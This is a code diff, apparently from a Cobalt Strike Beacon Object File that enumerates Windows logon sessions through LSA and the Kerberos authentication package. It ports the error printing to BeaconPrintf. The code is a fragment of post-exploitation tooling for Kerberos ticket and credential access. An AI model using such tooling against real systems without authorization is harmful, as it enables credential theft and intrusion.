@@ -53,20 +53,20 @@ void execute_sessions(HANDLE hToken, LUID luid, BOOL currentLuid) {
     BOOL highIntegrity = IsHighIntegrity(hToken);
 //    BOOL highIntegrity = TRUE;
     if (!highIntegrity && !currentLuid) {
-        PRINT(dispatch, "[!] Not in high integrity.\n");
+        BeaconPrintf(CALLBACK_ERROR, "[!] Not in high integrity.\n");
         return;
     }
     HANDLE hLsa;
     NTSTATUS status = GetLsaHandle(hToken, highIntegrity, &hLsa);
     if (!NT_SUCCESS(status)) {
-        PRINT(dispatch, "[!] GetLsaHandle %ld\n", status);
+        BeaconPrintf(CALLBACK_ERROR, "[!] GetLsaHandle %ld\n", status);
         return;
     }
     ULONG authPackage;
     LSA_STRING krbAuth = {.Buffer = "kerberos", .Length = 8, .MaximumLength = 9};
     status = SECUR32$LsaLookupAuthenticationPackage(hLsa, &krbAuth, &authPackage);
     if (!NT_SUCCESS(status)) {
-        PRINT(dispatch, "[!] LsaLookupAuthenticationPackage %ld\n", ADVAPI32$LsaNtStatusToWinError(status));
+        BeaconPrintf(CALLBACK_ERROR, "[!] LsaLookupAuthenticationPackage %ld\n", ADVAPI32$LsaNtStatusToWinError(status));
         SECUR32$LsaDeregisterLogonProcess(hLsa);
         return;
     }
@@ -75,7 +75,7 @@ void execute_sessions(HANDLE hToken, LUID luid, BOOL currentLuid) {
     status = GetLogonSessionData(luid, &sessionData);
 
     if (!NT_SUCCESS(status)) {
-        PRINT(dispatch, "[!] GetLogonSessionData: %ld", status);
+        BeaconPrintf(CALLBACK_ERROR, "[!] GetLogonSessionData: %ld", status);
         SECUR32$LsaDeregisterLogonProcess(hLsa);
         return;
     }
@@ -86,7 +86,7 @@ void execute_sessions(HANDLE hToken, LUID luid, BOOL currentLuid) {
 //        if (sessionData.sessionData[i] == NULL) {
 //            continue;
 //        }
-//        PrintLogonSessionData(dispatch, (*sessionData.sessionData[i]));
+//        PrintLogonSessionData(CALLBACK_ERROR, (*sessionData.sessionData[i]));
          WCHAR* sid = NULL;
          ADVAPI32$ConvertSidToStringSidW(sessionData.sessionData[i]->Sid, &sid);
          SYSTEMTIME logon_utc = ConvertToSystemtime(sessionData.sessionData[i]->LogonTime);
